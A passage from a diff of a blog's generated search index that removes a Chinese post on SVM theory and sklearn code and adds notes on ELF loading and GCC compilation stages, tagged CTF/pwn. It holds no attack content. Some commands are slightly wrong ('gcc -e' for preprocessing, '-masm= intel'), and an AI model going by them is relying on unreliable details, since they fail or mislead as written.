id="可执行文件的装载">可执行文件的装载</h2><p>当运行一个可执行文件时，首先需要将该文件和动态链接库装载到进程空间，形成一个进程镜像。</p><p>每个进程都有独立的虚拟地址空间，空间的布局由<strong>程序头（program header）</strong>决定，通过<code>readelf -l file</code>可以看到节到段的映射，以及段的地址空间布局。每一个段都包含一个或多个节，因为随着节数量的增多，在进行内存映射时就会大量浪费空间和资源。系统并不关心节的实际内容，而是不同节的读写、执行的权限。</p><h2 id="参考">参考</h2><p><a href="https://zhuanlan.zhihu.com/p/286088470">ELF文件格式 - 知乎 (zhihu.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/380180101">gcc 编译命令详解及最佳实践 - 知乎 (zhihu.com)</a></p>]]></content>
+      
+      
       <categories>
-        <category>deep_learning</category>
+          
+          <category> CTF </category>
+          
       </categories>
-      <tags>
-        <tag>model</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SVM</title>
-    <url>/2021/10/17/SVM.html</url>
-    <content><![CDATA[<h1 id="svm模型">SVM模型</h1>
-<h2 id="简介">简介</h2>
-<p><strong>支持向量机（support vector machines, SVM）</strong>是一种<strong>二分类模型</strong>，它的基本模型是定义在特征空间上的<strong>间隔最大的线性分类器</strong>，间隔最大使它有别于感知机；SVM还包括<strong>核技巧</strong>，这使它成为实质上的非线性分类器。</p>
-<span id="more"></span>
-<p>SVM的的学习策略就是间隔最大化，可形式化为一个求解<strong>凸二次规划</strong>的问题，也等价于正则化的合页损失函数的最小化问题。SVM的的学习算法就是求解凸二次规划的最优化算法。</p>
-<meta name="referrer" content="no-referrer"/>
-<h2 id="相关概念">相关概念</h2>
-<p><strong>线性可分</strong>：二维空间上，两类点被一条直线完全分开叫做线性可分。</p>
-<p><img src="https://www.zhihu.com/equation?tex=D_0" alt="[公式]" /> 和 <img src="https://www.zhihu.com/equation?tex=D_1" alt="[公式]" /> 是 n 维欧氏空间中的两个点集。如果存在 n 维向量 w 和实数 b，使得所有属于 <img src="https://www.zhihu.com/equation?tex=D_0" alt="[公式]" /> 的点 <img src="https://www.zhihu.com/equation?tex=x_i" alt="[公式]" /> 都有 <img src="https://www.zhihu.com/equation?tex=wx_i+%2B+b+%3E+0" alt="[公式]" /> ，而对于所有属于 <img src="https://www.zhihu.com/equation?tex=D_1" alt="[公式]" /> 的点 <img src="https://www.zhihu.com/equation?tex=x_j" alt="[公式]" /> 则有 <img src="https://www.zhihu.com/equation?tex=wx_j+%2B+b+%3C+0" alt="[公式]" /> ，则我们称 <img src="https://www.zhihu.com/equation?tex=D_0" alt="[公式]" /> 和 <img src="https://www.zhihu.com/equation?tex=D_1" alt="[公式]" /> 线性可分。</p>
-<p><strong>最大间隔平面</strong>：从二维扩展到多维空间中时，将 <img src="https://www.zhihu.com/equation?tex=D_0" alt="[公式]" /> 和 <img src="https://www.zhihu.com/equation?tex=D_1" alt="[公式]" /> 完全正确地划分开的 <img src="https://www.zhihu.com/equation?tex=wx%2Bb%3D0" alt="[公式]" /> 就成了一个超平面。</p>
-<p>为了使这个超平面更具<strong>鲁棒性</strong>，我们会去找最佳超平面，以最大间隔把两类样本分开的超平面，也称之为最大间隔超平面。</p>
-<p><strong>支持向量</strong>：样本中距离超平面最近的一些点，这些点叫做支持向量。</p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210902194615509-1318363853.jpg" alt="img" style="zoom:67%;float: center;" ></p>
-<h2 id="svm最优化问题"><strong>SVM最优化问题</strong></h2>
-<p>超平面表示方法 <span class="math display">\[
-w^{T} x+b=0
-\]</span> 扩展到 <span class="math inline">\(n\)</span> 维空间后，点 <span class="math inline">\(x=\left(x_{1}, x_{2} \ldots x_{n}\right)\)</span> 到直线 <span class="math inline">\(w^{T} x+b=0\)</span> 的距离为: <span class="math display">\[
-\frac{\left|w^{T} x+b\right|}{\|w\|}
-\]</span> 其中 <span class="math inline">\(\|w\|=\sqrt{w_{1}^{2}+\ldots w_{n}^{2}}\)</span></p>
-<p>支持向量到超平面的距离为 d，其他点到超平面的距离大于 d。</p>
-<p>于是有下列公式： <span class="math display">\[
-\begin{cases}\frac{w^{T} x+b}{\| w|| d} \geq 1 \quad y &amp; =1 \\ \frac{w^{T} x+b}{\|w\| d} \leq-1 &amp; y=-1\end{cases}
-\]</span> <span class="math inline">\(\|w\| d\)</span> 是正数, 我们暂且令它为 1 （之所以令它等于 1, 是为了方便推导和优化，且这样做对目 标函数的优化没有影响），故:</p>
-<p><strong>注</strong>：个人觉得是因为这个超平面对于一定的数据集是确定的，w是常数，d也是常熟，只是未知而已，但是是确定的，就像高中导数经常用的x0，去掉对优化无影响。 <span class="math display">\[
-\left\{\begin{array}{l}
-w^{T} x+b \geq 1 \quad y=1 \\
-w^{T} x+b \leq-1 \quad y=-1
-\end{array}\right.
-\]</span> 将两个方程合并，我们可以简写为:</p>
-<p><strong>注</strong>：还要加上y=1或-1的条件才行，参考中的这个有点问题 <span class="math display">\[
-y\left(w^{T} x+b\right) \geq 1
-\]</span> 至此我们就可以得到最大间隔超平面的上下两个超平面：</p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210902201557948-1924338082.jpg" alt="img" style="zoom:67%;float: center;" /></p>
-<p>每个支持向量到超平面的距离可以写为: <span class="math display">\[
-d=\frac{\left|w^{T} x+b\right|}{\|w\|}
-\]</span> 由上述 <span class="math inline">\(y\left(w^{T} x+b\right)&gt;1&gt;0\)</span> 可以得到 <span class="math inline">\(y\left(w^{T} x+b\right)=\left|w^{T} x+b\right|\)</span>, 所以我们得到: <span class="math display">\[
-d=\frac{y\left(w^{T} x+b\right)}{\|w\|}
-\]</span> 这里乘上 2 倍也是为了后面推导，对目标函数没有影响。刚刚我们得到支持向量 <span class="math inline">\(y\left(w^{T} x+b\right)=1\)</span>, 所以我们得到: <span class="math display">\[
-\max \frac{2}{\|w\|}
-\]</span> 再做一个转换: <span class="math display">\[
-\min \frac{1}{2}\|w\|
-\]</span> 为了方便计算（去除 <span class="math inline">\(\|w\|\)</span> 的根号），我们有: <span class="math display">\[
-\min \frac{1}{2}\|w\|^{2}
-\]</span> 所以得到的<strong>最优化问题</strong>是：s.t.是subject to 局限于,加上y=+1或-1 <span class="math display">\[
-\min \frac{1}{2}\|w\|^{2} 
-s . t . \quad y_{i}\left(w^{T} x_{i}+b\right) \geq 1
-\]</span> 这是一个含有不等式约束的凸二次规划问题，可以对其使用拉格朗日乘子法得到其对偶问题（dual problem）。</p>
-<h2 id="对偶问题">对偶问题</h2>
-<h3 id="拉格朗日乘数法">拉格朗日乘数法</h3>
-<p>就是微积分多元函数求极值那个</p>
-<h4 id="等式约束优化问题">等式约束优化问题</h4>
-<p><span class="math display">\[
-\min f\left(x_{1}, x_{2}, \ldots, x_{n}\right)
-\]</span> s.t. <span class="math inline">\(\quad h_{k}\left(x_{1}, x_{2}, \ldots, x_{n}\right)=0 \quad k=1,2, \ldots, l\)</span></p>
-<p>我们令 <span class="math inline">\(L(x, \lambda)=f(x)+\sum_{k=1}^{l} \lambda_{k} h_{k}(x)\)</span>, 函数 <span class="math inline">\(L(x, y)\)</span> 称为 Lagrange 函数，参数 <span class="math inline">\(\lambda\)</span> 称 为 Lagrange 乘子没有非负要求。 利用必要条件找到可能的极值点: <span class="math display">\[
-\begin{cases}\frac{\partial L}{\partial x_{i}}=0 &amp; i=1,2, \ldots, n \\ \frac{\partial L}{\partial \lambda_{k}}=0 &amp; k=1,2, \ldots, l\end{cases}
-\]</span> 等式约束下的 Lagrange 乘数法引入了 <img src="https://www.zhihu.com/equation?tex=l" alt="[公式]" /> 个 Lagrange 乘子，我们将 <img src="https://www.zhihu.com/equation?tex=x_%7Bi%7D" alt="[公式]" /> 与 <img src="https://www.zhihu.com/equation?tex=%5Clambda_%7Bk%7D" alt="[公式]" /> 一视同仁，把 <img src="https://www.zhihu.com/equation?tex=%5Clambda_%7Bk%7D+" alt="[公式]" /> 也看作优化变量，共有 <img src="https://www.zhihu.com/equation?tex=%28n%2Bl%29" alt="[公式]" /> 个优化变量。</p>
-<h4 id="不等式约束优化问题">不等式约束优化问题</h4>
-<p>主要思想是将不等式约束条件转变为等式约束条件，引入<strong>松弛变量</strong>，将松弛变量也是为优化变量。</p>
-<p>可以写为: <span class="math display">\[
-\begin{array}{ll}
-\underset{x}{\operatorname{minimize}} &amp; f(\boldsymbol{x}) \\
-\text { subject to } &amp; g_{i}(\boldsymbol{x}) \leq 0, i=1,2, \cdots, m
-\end{array}
-\]</span> 引入拉格朗日乘子 <span class="math inline">\(\left(\mu_{i} \geq 0\right)\)</span>, 定义上述问题的拉格朗日量 (Lagrangian) 如下 <span class="math display">\[
-L(x, \mu)=\left[f(x)+\sum_{i=1}^{m} \mu_{i} g_{i}(x)\right]
-\]</span> 同时定义拉格朗日对偶函数 (Lagrange dual function) 如下: <span class="math display">\[
-F(\mu)=i n f_{x} L(x, \mu)=i n f_{x}\left[f(x)+\sum_{i=1}^{m} \mu_{i} g_{i}(x)\right]
-\]</span> 一般情况下, <span class="math inline">\(L(x, \mu)\)</span> 是能取到最小值的, 所以 <span class="math inline">\(F(\mu)=\inf _{x} L(x, \mu)=\min _{x} L(x, \mu)\)</span> 求解。当强对偶性成立时, 通过KKT条件求解极值点, 然后从极值点挑出最值点。</p>
-<p>求解。当强对偶性成立时，通过KKT条件求解极值点，然后从极值点挑出最值点。 <span class="math display">\[
-\left\{\begin{array}{l}
-\nabla f(x)+\sum_{i=1}^{m} \mu_{i} \nabla g_{i}(x)=0 \\
-g_{i}(x) \leq 0, \forall i=1, \cdots, m \\
-\mu_{i} \geq 0, \forall i=1, \cdots, m \\
-\mu_{i} g_{i}(x)=0, \forall j=1, \cdots, m
-\end{array}\right.
-\]</span> 第一个条件使得目标函数和约束函数的法向量共线（梯度共线）。 最后一个条件称为互补松弛条件(Complementary Slackness Condition)。通过引入这个条件, 增加了m个等式约束，使得等式的数量跟变量一样。</p>
-<h3 id="强对偶性">强对偶性</h3>
-<p>对偶问题其实就是将: <span class="math display">\[
-\begin{gathered}
-\min _{w} \max _{\lambda} L(w, \lambda) \\
-s . t . \quad \lambda_{i} \geq 0
-\end{gathered}
-\]</span> 变成了： <span class="math display">\[
-\begin{gathered}
-\max _{\lambda} \min _{w} L(w, \lambda) \\
-s . t . \quad \lambda_{i} \geq 0
-\end{gathered}
-\]</span> 类似于上面的倒数得到SVM最优化问题的表达式。</p>
-<p>假设有个函数 <span class="math inline">\(f\)</span> 我们有: <span class="math display">\[
-\min \max f \geq \max \min f
-\]</span> 也就是说，最大的里面挑出来的最小的也要比最小的里面挑出来的最大的要大。这关系实际上就是 弱对偶关系，而强对偶关系是当等号成立时，即: <span class="math display">\[
-\min \max f=\max \min f
-\]</span> 如果 <span class="math inline">\(f\)</span> 是凸优化问题，强对偶性成立。</p>
-<h2 id="svm优化过程">SVM优化过程</h2>
-<p><strong>SVM优化公式</strong>： <span class="math display">\[
-\begin{aligned}
-  &amp;\quad \min _{w} \frac{1}{2}\|w\|^{2} \\
-       &amp;\text { s.t. } \quad g_{i}(w, b)=1-y_{i} \quad\left(w^{T} x_{i}+b\right) \leq 0, \quad i=1,2, \ldots, n
-\end{aligned}
-\]</span></p>
-<h3 id="构造拉格朗日函数">构造拉格朗日函数</h3>
-<p>微积分多元函数学的，忘得差不多了。。，就是用来求最大最小值的 <span class="math display">\[
-\begin{aligned}
-\min _{w, b} \max _{\lambda} L(w, b, \lambda)=&amp; \frac{1}{2}\|w\|^{2}+\sum_{i=1}^{n} \lambda_{i}\left[1-y_{i}\left(w^{T} x_{i}+b\right)\right] \\
-&amp; s . t . \quad \lambda_{i} \geq 0
-\end{aligned}
-\]</span></p>
-<h3 id="利用强对偶性转化">利用强对偶性转化：</h3>
-<p>利用强对偶性转化: <span class="math display">\[
-\max _{\lambda} \min _{w, b} L(w, b, \lambda)
-\]</span> 现对参数 <span class="math inline">\(\mathrm{w}\)</span> 和 <span class="math inline">\(\mathrm{b}\)</span> 求偏导数: <span class="math display">\[
-\begin{aligned}
-&amp;\frac{\partial L}{\partial w}=w-\sum_{i=1}^{n} \lambda_{i} x_{i} y_{i}=0 \\
-&amp;\frac{\partial L}{\partial b}=\sum_{i=1}^{n} \lambda_{i} y_{i}=0
-\end{aligned}
-\]</span> 得到: <span class="math display">\[
-\begin{aligned}
-\sum_{i=1}^{n} \lambda_{i} x_{i} y_{i} &amp;=w \\
-\sum_{i=1}^{n} \lambda_{i} y_{i} &amp;=0
-\end{aligned}
-\]</span> 我们将这个结果带回到函数中可得: <span class="math display">\[
-\begin{aligned}
-L(w, b, \lambda) &amp;=\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)+\sum_{i=1}^{n} \lambda_{i}-\sum_{i=1}^{n} \lambda_{i} y_{i}\left(\sum_{j=1}^{n} \lambda_{j} y_{j}\left(x_{i} \cdot x_{j}\right)+b\right) \\
-&amp;=\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)+\sum_{i=1}^{n} \lambda_{i}-\sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)-\sum_{i=1}^{n} \lambda_{i} y_{i} b \\
-&amp;=\sum_{i=1}^{n} \lambda_{i}-\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)
-\end{aligned}
-\]</span> 也就是说: <span class="math display">\[
-\min _{w, b} L(w, b, \lambda)=\sum_{i=1}^{n} \lambda_{i}-\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)
-\]</span> 去掉了w和b变量，得到只含有一个变量的式子，如下：</p>
-<p><span class="math display">\[
-\begin{gathered}
-\max _{\lambda}\left[\sum_{i=1}^{n} \lambda_{i}-\frac{1}{2} \sum_{i=1}^{n} \sum_{j=1}^{n} \lambda_{i} \lambda_{j} y_{i} y_{j}\left(x_{i} \cdot x_{j}\right)\right] \\
-\text { s.t. } \sum_{i=1}^{n} \lambda_{i} y_{i}=0 \quad \lambda_{i} \geq 0
-\end{gathered}
-\]</span> 我们可以看出来这是一个二次规划问题，问题规模正比于训练样本数，我们常用 <strong>SMO(Sequential Minimal Optimization) 算法</strong>求解。</p>
-<p><strong>SMO(Sequential Minimal Optimization)，序列最小优化算法</strong>，其核心思想非常简单：每次只优 化一个参数, 其他参数先固定住, 仅求当前这个优化参数的极值。我们来看一下 SMO 算法在 SVM 中的应用。 我们刚说了 SMO 算法每次只优化一个参数，但我们的优化目标有约束条件: <span class="math inline">\(\sum_{i=1}^{n} \lambda_{i} y_{i}=0\)</span>,</p>
-<ol type="1">
-<li>选择两个需要更新的参数 <span class="math inline">\(\lambda_{i}\)</span> 和 <span class="math inline">\(\lambda_{j}\)</span>, 固定其他参数。于是我们有以下约束: 这样约束就变成了： <span class="math display">\[
-\lambda_{i} y_{i}+\lambda_{j} y_{j}=c \quad \lambda_{i} \geq 0, \lambda_{j} \geq 0
-\]</span> 其中 <span class="math inline">\(c=-\sum_{k \neq i, j} \lambda_{k} y_{k}\)</span>, 由此可以得出 <span class="math inline">\(\lambda_{j}=\frac{c-\lambda_{i} y_{i}}{y_{j}}\)</span>, 也就是说我们可以用 <span class="math inline">\(\lambda_{i}\)</span> 的表达 式代替 <span class="math inline">\(\lambda_{j}\)</span> 。这样就相当于把目标问题转化成了仅有一个约束条件的最优化问题, 仅有的约束是 <span class="math inline">\(\lambda_{i} \geq 0\)</span></li>
-<li>对于仅有一个约束条件的最优化问题，我们完全可以在 <span class="math inline">\(\lambda_{i}\)</span> 上对优化目标求偏导, 令导数为 零, 从而求出变量值 <span class="math inline">\(\lambda_{i_{\text {new }}}\)</span>, 然后根据 <span class="math inline">\(\lambda_{i_{\text {new }}}\)</span> 求出 <span class="math inline">\(\lambda_{j_{\text {new }}}\)</span> 。</li>
-<li>多次迭代直至收敛。 通过 <span class="math inline">\(\mathrm{SMO}\)</span> 求得最优解 <span class="math inline">\(\lambda^{*}\)</span> 。</li>
-</ol>
-<p>求偏导数时得到： <span class="math display">\[
-w=\sum_{i=1}^{m} \lambda_{i} y_{i} x_{i}
-\]</span> 由上式可求得 <span class="math inline">\(\mathrm{w}\)</span> 。 我们知道所有 <span class="math inline">\(\lambda_{i}&gt;0\)</span> 对应的点都是支持向量, 我们可以随便找个支持向量, 然后带入： <span class="math inline">\(y_{s}\left(w x_{s}+b\right)=1\)</span>, 求出 <span class="math inline">\(b\)</span> 即可, 两边同乘 <span class="math inline">\(y_{s}\)</span>, 得 <span class="math inline">\(y_{s}^{2}\left(w x_{s}+b\right)=y_{s}\)</span> 因为 <span class="math inline">\(y_{s}^{2}=1\)</span>, 所以: <span class="math inline">\(b=y_{s}-w x_{s}\)</span> 为了更具鲁棒性，我们可以求得支持向量的均值: <span class="math display">\[
-b=\frac{1}{|S|} \sum_{s \in S}\left(y_{s}-w x_{s}\right)
-\]</span> 步骤 <span class="math inline">\(5: \mathrm{w}\)</span> 和 <span class="math inline">\(\mathrm{b}\)</span> 都求出来了，我们就能构造出最大分割超平面： <span class="math inline">\(\boldsymbol{w}^{T} x+b=0\)</span> 分类决策函数： <span class="math inline">\(f(x)=\operatorname{sign}\left(w^{T} x+b\right)\)</span> 其中 <span class="math inline">\(\operatorname{sign}(\cdot)\)</span> 为阶跃函数： <span class="math display">\[
-\operatorname{sign}(x)=\left\{\begin{array}{rl}
--1 &amp; x&lt;0 \\
-0 &amp; x=0 \\
-1 &amp; x&gt;0
-\end{array}\right.
-\]</span> 将新样本点导入到决策函数中既可得到样本的分类。</p>
-<h2 id="核函数">核函数</h2>
-<h4 id="问题">问题</h4>
-<p>线性不可分问题：将二维线性不可分样本映射到高维空间中，让样本点在高维空间线性可分</p>
-<p><img src="https://img2020.cnblogs.com/blog/2348945/202109/2348945-20210902213653815-1203370718.jpg" alt="img" style="zoom:67%;" /></p>
-<h4 id="核函数意义">核函数意义</h4>
-<p>这是因为低维空间映射到高维空间后维度可能会很大，如果将全部样本的点乘全部计算好，这样的 <strong>计算量太大</strong>了。 但如果我们有这样的一核函数 <span class="math inline">\(k(x, y)=(\phi(x), \phi(y)), \quad x_{i}\)</span> 与 <span class="math inline">\(x_{j}\)</span> 在特征空间的内积等于 它们在原始样本空间中通过函数 <span class="math inline">\(k(x, y)\)</span> 计算的结果，我们就不需要计算高维甚至无穷维空间的 内积了。</p>
-<p>举个例子：假设我们有一个多项式核函数: <span class="math display">\[
-k(x, y)=(x \cdot y+1)^{2}
-\]</span> 带进样本点的后： <span class="math display">\[
-k(x, y)=\left(\sum_{i=1}^{n}\left(x_{i} \cdot y_{i}\right)+1\right)^{2}
-\]</span> 而它的展开项是： <span class="math display">\[
-\sum_{i=1}^{n} x_{i}^{2} y_{i}^{2}+\sum_{i=2}^{n} \sum_{j=1}^{i-1}\left(\sqrt{2} x_{i} x_{j}\right)\left(\sqrt{2} y_{i} y_{j}\right)+\sum_{i=1} n\left(\sqrt{2} x_{i}\right)\left(\sqrt{2} y_{i}\right)+1
-\]</span> 如果没有核函数，我们则需要把向量映射成: <span class="math display">\[
-x^{\prime}=\left(x_{1}^{2}, \ldots, x_{n}^{2}, \ldots \sqrt{2} x_{1}, \ldots, \sqrt{2} x_{n}, 1\right)
-\]</span> 然后在进行内积计算, 才能与多项式核函数达到相同的效果。</p>
-<h4 id="常见核函数">常见核函数</h4>
-<p>线性核函数 <span class="math display">\[
-k\left(x_{i}, x_{j}\right)=x_{i}^{T} x_{j}
-\]</span> 多项式核函数 <span class="math display">\[
-k\left(x_{i}, x_{j}\right)=\left(x_{i}^{T} x_{j}\right)^{d}
-\]</span> 高斯核函数 <span class="math display">\[
-k\left(x_{i}, x_{j}\right)=\exp \left(-\frac{\left\|x_{i}-x_{j}\right\|}{2 \delta^{2}}\right)
-\]</span></p>
-<h2 id="使用sklearn实现">使用sklearn实现</h2>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> svm</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">0</span>) <span class="comment"># 使用相同的seed()值，则每次生成的随即数都相同</span></span><br><span class="line"><span class="comment"># 创建可线性分类的数据集与结果集</span></span><br><span class="line">X = np.r_[np.random.randn(<span class="number">20</span>, <span class="number">2</span>) - [<span class="number">2</span>, <span class="number">2</span>], np.random.randn(<span class="number">20</span>,<span class="number">2</span>) + [<span class="number">2</span>, <span class="number">2</span>]]</span><br><span class="line">Y = [<span class="number">0</span>] * <span class="number">20</span> + [<span class="number">1</span>] * <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造 SVM 模型</span></span><br><span class="line">clf = svm.SVC(kernel=<span class="string">&#x27;linear&#x27;</span>)</span><br><span class="line">clf.fit(X, Y) <span class="comment"># 训练 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#然后就是收集这些数据来画平面图，因为这是一个二维的模型，因此可以假设超平面方程为 w0x + w1y + b = 0 转为点斜式就是: y = -(w0/w1)x - (b/w1) ：</span></span><br><span class="line">w = clf.coef_[<span class="number">0</span>]</span><br><span class="line">a = -w[<span class="number">0</span>] / w[<span class="number">1</span>] <span class="comment"># 斜率</span></span><br><span class="line">xx = np.linspace(-<span class="number">5</span>, <span class="number">5</span>) <span class="comment"># 在区间[-5, 5] 中产生连续的值，用于画线</span></span><br><span class="line">yy = a * xx - (clf.intercept_[<span class="number">0</span>]) / w[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">b = clf.support_vectors_[<span class="number">0</span>] <span class="comment"># 第一个分类的支持向量</span></span><br><span class="line">yy_down = a * xx + (b[<span class="number">1</span>] - a * b[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">b = clf.support_vectors_[-<span class="number">1</span>] <span class="comment"># 第二个分类中的支持向量</span></span><br><span class="line">yy_up = a * xx + (b[<span class="number">1</span>] - a * b[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> pylab <span class="keyword">as</span> pl</span><br><span class="line"></span><br><span class="line">pl.plot(xx, yy, <span class="string">&#x27;k-&#x27;</span>)</span><br><span class="line">pl.plot(xx, yy_down, <span class="string">&#x27;k--&#x27;</span>)</span><br><span class="line">pl.plot(xx, yy_up, <span class="string">&#x27;k--&#x27;</span>)</span><br><span class="line">pl.scatter(clf.support_vectors_[:, <span class="number">0</span>], clf.support_vectors_[:, <span class="number">1</span>],</span><br><span class="line">           s=<span class="number">80</span>, facecolors=<span class="string">&#x27;none&#x27;</span>)</span><br><span class="line">pl.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=Y, cmap=pl.cm.Paired)</span><br><span class="line"></span><br><span class="line">pl.axis(<span class="string">&#x27;tight&#x27;</span>)</span><br><span class="line">pl.show()</span><br></pre></td></tr></table></figure>
-<h2 id="总结">总结</h2>
-<h3 id="优点">优点</h3>
-<ul>
-<li>有严格的数学理论支持，可解释性强，不依靠统计方法，从而简化了通常的分类和回归问题；</li>
-<li>能找出对任务至关重要的关键样本（即：支持向量）；</li>
-<li>采用核技巧之后，可以处理非线性分类/回归任务；</li>
-<li>最终决策函数只由少数的支持向量所确定，计算的复杂性取决于支持向量的数目，而不是样本空间的维数，这在某种意义上避免了“维数灾难”。</li>
-</ul>
-<h3 id="缺点">缺点</h3>
-<ul>
-<li>训练时间长。当采用 SMO 算法时，由于每次都需要挑选一对参数，因此时间复杂度为 <img src="https://www.zhihu.com/equation?tex=O%28N%5E2%29" alt="[公式]" /> ，其中 N 为训练样本的数量；</li>
-<li>当采用核技巧时，如果需要存储核矩阵，则空间复杂度为 <img src="https://www.zhihu.com/equation?tex=O%28N%5E2%29" alt="[公式]" /> ；</li>
-<li>模型预测时，预测时间与支持向量的个数成正比。当支持向量的数量较大时，预测计算复杂度较高。</li>
-</ul>
-<p>因此支持向量机目前只适合小批量样本的任务，无法适应百万甚至上亿样本的任务。</p>
-<h2 id="参考">参考</h2>
-<p>[1] <a href="https://zhuanlan.zhihu.com/p/77750026">【机器学习】支持向量机 SVM（非常详细） - 知乎 (zhihu.com)</a></p>
-<p>[2] <a href="https://zhuanlan.zhihu.com/p/31886934">支持向量机（SVM）——原理篇 - 知乎 (zhihu.com)</a></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> pwn </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>GCC编译过程</title>
+      <link href="/2021/11/12/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.html"/>
+      <url>/2021/11/12/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.html</url>
+      
+        <content type="html"><![CDATA[<p>GCC（英文全拼：GNU Compiler Collection）是 GNU 工具链的主要组成部分，是一套以 GPL 和 LGPL 许可证发布的程序语言编译器自由软件，由 Richard Stallman 于 1985 年开始开发。</p><span id="more"></span><p>GCC 原名为 GNU C语言编译器，因为它原本只能处理 C 语言，但如今的 GCC 不仅可以编译 C、C++ 和 Objective-C，还可以通过不同的前端模块支持各种语言，包括 Java、Fortran、Ada、Pascal、Go 和 D 语言等等。</p><p>GCC 的编译过程可以划分为四个阶段：<strong>预处理（Pre-Processing）、编译（Compiling）、汇编（Assembling）以及链接（Linking）</strong>。</p><figure><img src="../images/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/2348945-20211111180607726-394481153.jpg" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HH 5</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here is a static library\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,HH);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="预处理">预处理</h2><p>主要是处理程序中以<strong>#</strong>开头的预处理指令，将其转换后插入文本中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -e hello.c -o hello.i</span><br></pre></td></tr></table></figure><ul><li>递归处理#include预处理指令，将对应文件的内容复制到该处,出现了很多extern的函数原型</li><li>删除#define，并且在其被引用处递归地展开所有的宏定义</li><li>处理所有条件预处理指令 #if #ifdef</li><li>删除注释</li><li>添加行号和文件名标识</li></ul><figure><img src="../images/GCC%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/2348945-20211111181618747-1578372619.png" alt="image-20211111181613056" /><figcaption aria-hidden="true">image-20211111181613056</figcaption></figure><h2 id="编译">编译</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.c -o hello.s</span><br><span class="line">gcc -S hello.i -o hello.s -masm= intel -fno-asynchronous-unwind-tables</span><br></pre></td></tr></table></figure><p>-masm= intel用于指定为intel格式</p><p>-fno-asynchronous-unwind-tables 用于生成没有cfi宏的汇编指令，提高可读性</p><p>可以看到只有单个参数的printf被替换成puts了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">.file&quot;hello.c&quot;</span><br><span class="line">.text</span><br><span class="line">.section.rodata</span><br><span class="line">.LC0:</span><br><span class="line">.string&quot;Here is a test of gcc&quot;</span><br><span class="line">.LC1:</span><br><span class="line">.string&quot;%d\n&quot;</span><br><span class="line">.text</span><br><span class="line">.globlfoo</span><br><span class="line">.typefoo, @function</span><br><span class="line">foo:</span><br><span class="line">.LFB0:</span><br><span class="line">.cfi_startproc</span><br><span class="line">pushq%rbp</span><br><span class="line">.cfi_def_cfa_offset 16</span><br><span class="line">.cfi_offset 6, -16</span><br><span class="line">movq%rsp, %rbp</span><br><span class="line">.cfi_def_cfa_register 6</span><br><span class="line">leaq.LC0(%rip), %rdi</span><br><span class="line">callputs@PLT</span><br><span class="line">movl$5, %esi</span><br><span class="line">leaq.LC1(%rip), %rdi</span><br><span class="line">movl$0, 